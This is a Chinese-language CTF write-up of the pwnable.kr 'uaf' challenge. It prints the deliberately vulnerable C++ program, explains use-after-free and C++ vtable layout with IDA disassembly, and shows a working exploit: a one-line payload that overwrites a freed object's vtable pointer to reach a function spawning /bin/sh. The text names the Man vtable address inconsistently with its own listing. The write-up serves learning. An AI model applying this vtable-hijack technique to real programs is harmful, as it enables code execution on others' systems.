---
title: pwnable.kr-uaf
date: 2018-01-29 21:02:00
tags: [pwnable.kr,PWN]
categories: CTF
---
# 前言
这道题有了pwn的味道了，自己虽然以前学习过二进制漏洞方面的知识但是都是windows方面的（还是新手），对于linux系统下的安全机制和一些关键的技术仍然不熟悉，做这道题参考了[别人的writeup](http://blog.csdn.net/qq_20307987/article/details/51511230)，这篇writeup很详细，对我这样的新手来说很友好。
# 分析
先分析源码`uaf.c`
```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}

```
整个逻辑简短分析。这是一个c++程序，定义了一个基类`Human`和继承的两个子类`Woman`,`Man`。其中关键的部分是基类中定义了两个虚函数`get_shell`,`introduce`。`main`函数中先是定义了两个子类的对象，然后循环结构中有3个`case`，第一个分别调用了`introduce`函数，第二个分配一个用户指定大小的的内存并向里面写入用户指定的数据，第三个执行前面两个对象的销毁。
逻辑清楚了，漏洞在哪呢？根据题目提示，这存在一个`uaf`漏洞。
## 知识点
`UAF`是`Use-After-Free`的缩写，也就是释放后重用漏洞。UAF漏洞的成因是一块堆内存被释放了之后又被使用。又被使用指的是：指针存在（“野”指针被引用）。这个引用的结果是不可预测的，因为不知道会发生什么。由于大多数的堆内存其实都是C++对象，所以利用的核心思路就是分配堆去占坑，占的坑中有自己构造的虚表。
uaf漏洞是一种内存破坏漏洞存在于各种操作系统中。对于本题来说，还要了解的技术如下
- linux内存分配和释放策略
- c++对象内存布局

对于这些参考搜索引擎即可，我找时间好好学习并总结一下（可以参考上面推荐的writeup）。
## 利用
了解了关键的技术接下来就是漏洞的利用。分析程序发现，只要先执行第三个`case`使对象释放，然后再重新申请同样大小的内存，那么根据linux内存的分配策略原先释放掉的对象内存就会被重新分配，这时再执行第一个`case`就会使用“野”指针执行虚函数调用。然而“野”指针指向的内存是由我控制的，于是就达到了利用的目的。然而本题由于有两个对象，且对象调用函数的顺序和内存先释放后分配的事实导致利用有些许改变，应该保证第一个对象（`m`）的函数调用不会引起异常，所以向内存中写入的数据以第一个对象为准。
利用流程就是`case3->case2-case2->case1`。利用思路就是改变虚表指针的值，使其指向虚表的前8个字节（因为`get_shell`是虚表中第一个函数，且题目系统是64位），从而使对象在调用`introduce`时调用`get_shell`而获得shell。所以getflag的关键就是找类`Man`的虚表。
```c
.rodata:0000000000401550 off_401550      dq offset _ZN5Human10give_shellEv
.rodata:0000000000401550                                         ; DATA XREF: Woman::Woman(std::string,int)+24o
.rodata:0000000000401550                                         ; Human::give_shell(void)
.rodata:0000000000401558                 dq offset _ZN5Woman9introduceEv ; Woman::introduce(void)
.rodata:0000000000401560                 public _ZTV3Man ; weak
.rodata:0000000000401560 ; `vtable for'Man
.rodata:0000000000401560 _ZTV3Man        db    0
.rodata:0000000000401561                 db    0
.rodata:0000000000401562                 db    0
.rodata:0000000000401563                 db    0
.rodata:0000000000401564                 db    0
.rodata:0000000000401565                 db    0
.rodata:0000000000401566                 db    0
.rodata:0000000000401567                 db    0
.rodata:0000000000401568                 db 0D0h ; 
.rodata:0000000000401569                 db  15h
.rodata:000000000040156A                 db  40h ; @
.rodata:000000000040156B                 db    0
.rodata:000000000040156C                 db    0
.rodata:000000000040156D                 db    0
.rodata:000000000040156E                 db    0
.rodata:000000000040156F                 db    0
.rodata:0000000000401570 off_401570      dq offset _ZN5Human10give_shellEv
.rodata:0000000000401570                                         ; DATA XREF: Man::Man(std::string,int)+24o
.rodata:0000000000401570                                         ; Human::give_shell(void)
.rodata:0000000000401578                 dq offset _ZN3Man9introduceEv ; Man::introduce(void)
.rodata:0000000000401580                 public _ZTV5Human ; weak
.rodata:0000000000401580 ; `vtable for'Human
.rodata:0000000000401580 _ZTV5Human      db    0
```
在ida中可以发现`Man`类的虚表地址是`0x401550`，然后就有了下面的利用过程
```bash
uaf@ubuntu:~$ python -c "print '\x48\x15\x40'+'\x00'*21" >/tmp/poc
uaf@ubuntu:~$ ./uaf 24 /tmp/poc
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ cat flag
yay_f1ag_aft3r_pwning
$ 

```
# 总结
感觉做这道题有了pwn的感觉了，学到了很多linux内存管理方面的东西，同时也专门去了解了uaf漏洞的东西，收货很大。